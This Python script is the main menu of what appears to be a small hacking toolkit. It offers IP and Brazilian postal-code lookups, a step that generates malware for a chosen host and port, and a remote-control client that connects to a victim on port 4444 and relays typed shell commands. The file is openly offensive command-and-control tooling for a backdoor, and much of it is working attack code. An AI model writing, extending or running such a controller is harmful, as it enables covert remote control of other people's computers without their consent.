#!/usr/lib/python3
import os
import socket
from include import moon_search
from config import layots, System
#Var
name = '__main__'
#Home_Page
if __name__ == name:
    try:
        System.Cls()
        layots.banner()
        layots.main()
        r = layots.cursor()
        if r == '01' or r == '1':
            System.Cls()
            layots.banner()
            layots.ipsearch()
            ip = layots.cursor()
            show_list= moon_search.search_ipv4(ip)
            System.Cls()
            layots.banner()
            print (show_list)
            qt = layots.page_home()
            System.Reboot()
        elif r == '2' or r == '02':
            System.Cls()
            layots.banner()
            layots.cepsearch()
            cep = layots.cursor()
            show_list = moon_search.search_cep(cep)
            print (show_list)
            qt = layots.page_home()
            System.Reboot()
        elif r == '3' or r == '03':
            
            System.Cls()
            layots.banner()
            layots.ipsearch()
            h = layots.cursor()
            layots.gn_malware()
            p = layots.cursor()
            System.DelMalware()
            System.time('1.0')
            System.DirMalware()
            System.time('2.0')
            moon_search.create_malware(h,p)
        elif r == '4' or r == '04':
            System.Cls()
            layots.banner()
            layots.ipsearch()
            h = layots.cursor()
            System.Cls()
            layots.banner()
            layots.ctr_malware()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((h,4444))
            while True:
                cmd = layots.cursor()
                if cmd == 'quit':
                    break
                    System.Reboot()
            
                s.send(cmd.encode())
                response = s.recv(1024)
                print (response.decode())
                
             
                
            
        elif r == '5' or r == '05':
            System.Cls()
            layots.banner()
            System.Creditos()
            System.time('10.0')
            qt = layots.page_home()
            System.Reboot()
        elif r == '0' or r == '00':
            System.Cls()
            layots.banner()
            print ('Exit Programming...')
            
    except:
       System.Cls()
       layots.banner()
       print ('Closing Programming...')